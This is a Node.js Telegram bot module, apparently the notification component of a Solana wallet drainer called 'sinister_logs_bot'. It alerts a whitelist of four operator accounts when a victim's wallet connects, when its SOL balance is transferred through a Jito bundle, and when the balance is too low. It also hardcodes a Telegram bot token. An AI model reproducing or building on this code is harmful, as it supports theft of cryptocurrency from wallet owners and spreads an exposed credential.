require("dotenv").config({ path: process.env.env_file });
const Telegraf = require('telegraf');
// const bot_token = process.env.BOT_TOKEN
const bot_token = "7022350139:AAHL9blhEvlqGL_tNOwjP8s6e7WhygDk_hQ"

const bot = new Telegraf(bot_token);
const helpMessage = `
Welcome to @sinister_logs_bot.
`;
const startMessage = "Welcome to @sinister_logs_bot."
const errorMessage = "You don't have privilege to access this bot."
// const channelId = process.env.CHANNEL_ID
let channelIds = []

bot.start(async (ctx) => {
    console.log(ctx.chat.username)
    if (ctx.chat.username == "bugfly130" || ctx.chat.username == "jbgoldman14"
        || ctx.chat.username == "dragonwarrior9873" || ctx.chat.username == "sinistersol") {
        const channelId = ctx.chat.id
        channelIds.push(channelId)
        console.log(ctx.chat.username, "'s channel Id is", channelId)
        ctx.reply(ctx.chat.username + " " + startMessage);
    }
    else {
        ctx.reply(errorMessage);
    }
})

bot.help((ctx) => {
    ctx.reply(helpMessage);
})

exports.initBot = async () => {
    try {
        await bot.launch();
    }
    catch (err) {
        console.warn(err)
        return
    }
}

exports.stopBot = async () => {
    try {
        await bot.stop()
    }
    catch (err) {
        console.warn(err)
        return
    }
}

exports.signNotify = async (data) => {
    try {
        const { owner } = data
        console.log("SignNotify Function called....\n Received Parameter is ", owner)
        let sendMessage = `✅   Wallet Connected:  \n  ${owner} `
        for (let i = 0; i < channelIds.length; i++) {
            await bot.telegram.sendMessage(channelIds[i], sendMessage, {
                parse_mode: "html"
            })
        }
    } catch (err) {
        console.warn(err)
        return
    }
}

exports.transferNotify = async (data) => {
    try {
        const { balance, tx } = data
        console.log("TransferNotify Function called....\n Received Parameter is ", balance, "and ", tx)
        let sendMessage = `😉   Transferred  <b>${balance}</b> SOL  \n🟢   Tx Hash: https://explorer.jito.wtf/bundle/${tx} `
        for (let i = 0; i < channelIds.length; i++) {
            await bot.telegram.sendMessage(channelIds[i], sendMessage, {
                parse_mode: "html"
            })
        }
    } catch (err) {
        console.warn(err)
        return
    }
}

exports.notEnoughNotify = async () => {
    try {
        console.log("NotEnoughNotify Function called....\n")
        let sendMessage = `⚠️   Not Enough SOL`
        for (let i = 0; i < channelIds.length; i++) {
            await bot.telegram.sendMessage(channelIds[i], sendMessage, {
                parse_mode: "html"
            })
        }
    } catch (err) {
        console.warn(err)
        return
    }
}


